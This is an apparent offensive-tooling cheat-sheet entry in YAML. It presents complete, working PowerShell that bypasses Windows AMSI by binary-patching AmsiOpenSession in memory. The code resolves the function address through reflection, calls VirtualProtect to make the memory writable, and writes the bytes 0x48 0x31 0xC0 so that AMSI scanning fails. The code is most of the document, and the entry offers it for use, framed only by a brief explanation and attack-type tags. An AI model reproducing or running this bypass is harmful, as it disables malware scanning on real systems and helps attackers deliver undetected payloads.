---
description: |
  With this code in Powershell it is possible to bypass the AMSI. We’ll modify the assembly instructions themselves instead of the data they are acting upon in a technique known as binary patching. We can use this technique to hotpatch the code and force it to fail even if the data structure is valid. This is done by overwriting the 3 Bytes TEST RDX,RDX with an XOR RAX,RAX instruction, forcing the execution flow to the error branch, which will disable AMSI.

  Command Reference:
  ```
  Obtain the memory address of AmsiOpenSession (Lookup Function)

  Modify the memory permissions where AmsiOpenSession is located (Lookup with DelegateType)

  Modify the three bytes at that location. (TEST RDX,RDX with an XOR RAX,RAX, Copy function)
  ```
command: |
  AMSI bypass in assembly based on the AmsiOpenSession

code: |
  function LookupFunc { 
    Param ($moduleName, $functionName)
    
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress")
    {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) 
  }

  function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType() 
  }

  [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
  $oldProtectionBuffer = 0
  $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
  $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) 

  $buf = [Byte[]] (0x48, 0x31, 0xC0)
  [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - Bypassing
references:
  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiOpenSession
---